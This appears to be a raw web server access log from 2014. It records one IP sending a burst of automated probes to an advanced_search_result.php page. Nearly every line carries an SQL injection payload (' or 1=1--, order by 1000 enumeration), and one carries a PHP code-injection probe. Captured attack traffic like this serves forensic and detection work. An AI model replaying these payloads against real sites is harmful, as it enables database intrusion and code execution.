ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:46	+0100]	GET /advanced_search_result.php?ved=)%20or%20('1'='1-- HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																					
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:46	+0100]	GET /advanced_search_result.php?ved='%20or%201=1/* HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																					
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:47	+0100]	GET /advanced_search_result.php?ved='%20or%201=1-- HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																					
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:48	+0100]	GET /advanced_search_result.php?ved=%20order%20by%201000/* HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																					
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:49	+0100]	GET /advanced_search_result.php?ved=order%20by%201000;-- HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																					
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:49	+0100]	GET /advanced_search_result.php?ved='%20order%20by%201000/* HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																					
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:50	+0100]	GET /advanced_search_result.php?ved='%20order%20by%201000;-- HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																					
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:50	+0100]	GET /advanced_search_result.php?ved='%20or%201=1-- HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																					
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:50	+0100]	GET /advanced_search_result.php?ved=\%20or%201=1--	HTTP/1.1"	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:51	+0100]	GET /advanced_search_result.php?ved=')%20or%20('a'='a HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:51	+0100]	GET /advanced_search_result.php?usg=${@print(md5(google_bot))} HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:52	+0100]	GET /advanced_search_result.php?usg=' HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)
ns2293618.ovh.net:80	195.242.152.45	-0	-0	[12/Nov/2014:11:45:52	+0100]	GET /advanced_search_result.php?usg=%20and%201= HTTP/1.1	302	576	-0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)

